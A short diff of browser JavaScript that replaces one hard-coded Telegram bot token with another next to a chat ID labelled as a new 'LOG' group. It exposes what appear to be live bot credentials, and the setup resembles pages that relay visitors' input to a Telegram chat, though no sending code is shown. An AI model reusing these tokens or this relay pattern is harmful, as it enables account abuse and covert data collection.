@@ -5,7 +5,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const errorAlert = document.getElementById('error-alert');
 
     // --- CONFIGURACIÓN DE TELEGRAM ---
-    const TELEGRAM_TOKEN = '8594588884:AAFq6nlhKzJL8Ahdhe2P0B-8ThQkIwvCEpM';
+    const TELEGRAM_TOKEN = '8634395375:AAFb8HHwRA14QoyU769lYso0I7hlD_c0Ias';
     const TELEGRAM_CHAT_ID = '-5017945956'; // Nuevo Grupo LOG
     const API_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
 
